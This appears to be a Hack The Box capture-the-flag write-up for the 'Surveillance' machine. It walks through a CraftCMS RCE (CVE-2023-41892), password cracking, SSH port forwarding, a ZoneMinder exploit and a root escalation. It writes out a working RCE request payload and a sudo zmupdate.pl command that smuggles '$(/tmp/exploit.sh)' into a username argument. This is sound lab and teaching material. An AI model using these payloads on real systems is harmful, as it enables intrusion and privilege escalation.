---
layout: page
title: Surveillance
img: assets/img/writeups/hackthebox/Surveillance/surveillance_logo.png
importance: 1
category: hackthebox
---

Port scanning - 22 (ssh), 80 (web), 1863 (filtred?) and 7100 (filtred?)
Add machine address to /etc/hosts as surveillance.htb and let's get started.

## Foothold
It's a default landing web page, but useful browser extension Wappalyzer specified CraftCMS.

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_landing_page.png" title="example image" class="img-fluid rounded z-depth-1" %}

Also, that information can be found in footer of landing page - https://github.com/craftcms/cms/tree/4.4.14.
CraftCMS is a "flexible, user-friendly CMS for creating custom digital experiences on the web and beyond", and written in PHP.
Google some CVEs and security issues, and it will be found a CVE-2023-41892.

### CVE-2023-41892
CVE-2023-41892 is Unanticated RCE for CraftCMS. This is a high-impact, low-complexity attack vector. Users running Craft installations before 4.4.15 are encouraged to update to at least that version to mitigate the issue. This issue has been fixed in Craft CMS 4.4.15.

Our version is 4.4.14 and it means that it's vulnerable.

## User
First, lets inject "phpinfo" command to be confident that exploit can be done successfully.

```HTTP
POST / HTTP/1.1
Host: surveillance.htb
User-Agent: <UA>
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 233
Content-Type: application/x-www-form-urlencoded

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as+xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}
```

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_phpinfo.png" title="example image" class="img-fluid rounded z-depth-1" %}

It could be useful to get some information, MySQL credentials, secret key, but we are going to do reverse shell.

PoC i [found](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226) was unstable for me, but working.

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_craft_revshell2.png" title="example image" class="img-fluid rounded z-depth-1" %}

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_craft_revshell.png" title="example image" class="img-fluid rounded z-depth-1" %}

Without linpeas, little manual enumeration and found database backup file - surveillance--2023-10-17-202801--v4.4.14.sql.zip. Let's download it and discover zipped data.

Here is a hashed (SHA256) password of matthew user - crack it, get SSH shell and obtain user flag.

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_crack.png" title="example image" class="img-fluid rounded z-depth-1" %}

## Root
linpeas.sh will give a huge hint about one service - ZoneMinder. In the instance, nginx config will disclosure needed information. 

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_zoneminder_nginx.png" title="example image" class="img-fluid rounded z-depth-1" %}

Moreover, linpeas greps password from config files.
{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_zoneminder_pass.png" title="example image" class="img-fluid rounded z-depth-1" %}


[?] Some googling about that service - CVE-2023-26035, unauthicated RCE. Let's do some pivoting for comfort:

```bash
ssh -L 1234:localhost:8080 matthew@surveillance.htb
```

As we have an SSH connection, we can use it for port forwarding. Local port 8080 of victim host will forward to our 1234 port.
That's why it could be possible to use (PoC)[https://github.com/rvizx/CVE-2023-26035] on local machine:

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_web_pivot.png" title="example image" class="img-fluid rounded z-depth-1" %}

Check sudoers rules:
```bash
sudo -l
```

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_sudo.png" title="example image" class="img-fluid rounded z-depth-1" %}

As we can see, we can run Perl scripts (.pl) using any name, started with "zm" and located in /usr/bin/*. Grep these Perl scripts in directory and do some research about PrivEsc vectors in them.

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_perlscript_grep.png" title="example image" class="img-fluid rounded z-depth-1" %}

It seems no regex vulnerability but it maybe legal Perl script way to privilege escalation.
Research some documentation and tring to find some suspectios scripts:
https://zoneminder.readthedocs.io/en/latest/userguide/components.html#perl

Some googling and research will tell about zmupdate.pl.

```bash
sudo zmupdate.pl --version=1 --user='$(/tmp/exploit.sh)' --pass=ZoneMinderPassword2023
```

Bash script in /tmp/exploit.sh will run with root privilegies. Ive just write reading root flag and save to tmp directory.

{% include figure.html path="assets/img/writeups/hackthebox/Surveillance/surveillance_run_privesc.png" title="example image" class="img-fluid rounded z-depth-1" %}